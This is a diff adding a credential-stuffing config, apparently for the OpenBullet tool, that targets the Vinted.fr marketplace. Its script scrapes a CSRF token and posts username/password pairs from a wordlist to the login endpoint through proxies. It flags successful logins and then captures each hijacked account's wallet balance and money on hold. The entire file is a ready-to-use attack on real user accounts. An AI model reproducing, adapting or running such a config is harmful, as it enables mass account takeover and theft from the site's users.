@@ -1,0 +1,61 @@
+[SETTINGS]
+{
+  "Name": "Vinted.fr",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-22T15:38:13.8277664+02:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.vinted.fr/" AutoRedirect=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "csrf-token\" content=\"" "\" />" -> VAR "TOKEN" 
+REQUEST POST "https://www.vinted.fr/member/general/login.json" AutoRedirect=FALSE 
+  CONTENT "utf8=%E2%9C%93&authenticity_token=<TOKEN>&login=<USER>&password=<PASS>&button=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "authority: www.vinted.fr" 
+  HEADER "method: POST" 
+  HEADER "path: /member/general/login.json" 
+  HEADER "scheme: https" 
+  HEADER "origin: https://www.vinted.fr" 
+  HEADER "referer: https://www.vinted.fr/member/general/login?ref_url=" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "x-csrf-token: <TOKEN>" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "status\":\"OK\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"success\":false" 
+REQUEST GET "https://www.vinted.fr/wallet/balance" AutoRedirect=FALSE 
+  
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "authority: www.vinted.fr" 
+  HEADER "method: GET" 
+  HEADER "path: /wallet/balance" 
+  HEADER "scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+PARSE "<SOURCE>" LR "body c-text--left c-text\">" "</div>" -> CAP "Money on Hold" 
+PARSE "<SOURCE>" LR "<h3 class=\"c-text--heading c-text--center c-text\">" "</h3>" -> CAP "Money " 
